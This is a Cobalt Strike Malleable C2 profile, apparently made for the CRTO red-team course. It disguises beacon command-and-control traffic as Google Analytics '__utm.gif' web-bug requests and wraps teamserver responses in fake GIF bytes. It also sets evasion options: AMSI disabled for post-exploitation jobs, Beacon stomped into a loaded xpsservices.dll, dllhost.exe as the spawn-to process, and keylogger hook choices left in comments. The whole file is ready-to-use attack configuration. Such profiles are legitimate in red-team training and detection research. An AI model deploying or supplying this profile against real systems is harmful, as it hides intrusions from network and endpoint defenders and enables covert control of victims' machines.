# Custom C2 Profile for CRTO (modified by yoshihacks)
# makes our traffic look like a Google Web Bug 
set sample_name "yoshihacks";
set sleeptime "2000";
set jitter    "20";
set useragent "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36";
set tasks_max_size "2097152"; #enable this for Kerberos Relay Attacks


stage {
        set userwx "false"; #Allocate Beacon DLL as RW/RX rather than RWX.
        set cleanup "true"; #Free memory associated with reflective loader after it has been loaded
        set obfuscate "true"; # Load Beacon into memory without its DLL headers
        set module_x64 "xpsservices.dll"; #Load DLL from disk, then replace its memory with Beacon.
        set module_x86 "xpsservices.dll"; # Load DLL from disk on 32 bit machines, and replace its memory with Beacon. 
                   # set stomppe  "true";
                    #set sleep_mask     "true";
                   # set smartinject    "true";
}

post-ex {
        set amsi_disable "true"; # disable AMSI in powerpick, execute-assembly, and psinject
        # Malleable C2 amsi_disable does not applies to Cobalt Strike Jump Command (psexec_psh , winrm and winrm64).
                                # Read this blog - https://offensivedefence.co.uk/posts/making-amsi-jump/

        set spawnto_x64 "%windir%\\sysnative\\dllhost.exe";
        set spawnto_x86 "%windir%\\syswow64\\dllhost.exe";


                # change the permissions and content of our post-ex DLLs
                #set obfuscate "true";
                # pass key function pointers from Beacon to its child jobs
                #set smartinject "true";

                # Modify our post-ex pipe names
                # set pipename "msagent-###-0,";
                # set keylogger "GetAsyncKeyState";
                # set threadhint "module!function+0x##"
                # set thread_hint "ntdll.dll!RtlUserThreadStart";
                # set pipename "UserNamePipe##";
                # set keylogger "SetWindowsHookEx";
}

http-get {
        # set uri specifies the URI that the client and server will use. 
        # if uri doesn't match the profile, teamserver sends a 404
        set uri "/__utm.gif";

        # add additional parameters that appear after the url
        # key value -> "utmac" "UA-2202604-2" -> /__utm.gif?utmac=UA-2202604-2
        client {
                parameter "utmac" "UA-2202604-2";
                parameter "utmcn" "1";
                parameter "utmcs" "ISO-8859-1";
                parameter "utmsr" "1280x1024";
                parameter "utmsc" "32-bit";
                parameter "utmul" "en-US";

                # Beacon to teamserver communication 
                # transofrorm is specified with netbios, bas64, or mask(XOR)
                # then we prepend string data
                # finally specify where the transaction will be: can be URI parameter, a header, or in the body. 
                # the following metadata will look like: __utma=GMGLGGGKGKGEHDGGGMGKGMHDGEGHGGGI
                metadata {
                        netbios;
                        prepend "__utma";
                        parameter "utmcc";
                }
        }
        # server defines how teamserver response will look. 
        server {
                header "Content-Type" "image/gif";
                # output dictates how the data being sent by teamserver will be transformed. 
                # data can be prepended before being terminated with the print statement.
                output {
                        # hexdump pixel.gif
                        # 0000000 47 49 46 38 39 61 01 00 01 00 80 00 00 00 00 00
                        # 0000010 ff ff ff 21 f9 04 01 00 00 00 00 2c 00 00 00 00
                        # 0000020 01 00 01 00 00 02 01 44 00 3b

                        prepend "\x01\x00\x01\x00\x00\x02\x01\x44\x00\x3b";
                        prepend "\xff\xff\xff\x21\xf9\x04\x01\x00\x00\x00\x2c\x00\x00\x00\x00";
                        prepend "\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\x00\x00";

                        print;
                }
        }
}

# http post is the same at http get, but for HTTP POST transactions. 
http-post {
        set uri "/___utm.gif";
        client {
                header "Content-Type" "application/octet-stream";

                id {
                        prepend "UA-220";
                        append "-2";
                        parameter "utmac";
                }

                parameter "utmcn" "1";
                parameter "utmcs" "ISO-8859-1";
                parameter "utmsr" "1280x1024";
                parameter "utmsc" "32-bit";
                parameter "utmul" "en-US";

                output {
                        print;
                }
        }

        server {
                header "Content-Type" "image/gif";

                output {
                        prepend "\x01\x00\x01\x00\x00\x02\x01\x44\x00\x3b";
                        prepend "\xff\xff\xff\x21\xf9\x04\x01\x00\x00\x00\x2c\x00\x00\x00\x00";
                        prepend "\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\x00\x00";
                        print;
                }
        }
}

http-stager {

        server {
                header "Content-Type" "application/octet-stream";
                header "Server" "Microsoft IIS/10.0";
                header "X-Powered-By" "ASP.NET";
        }
}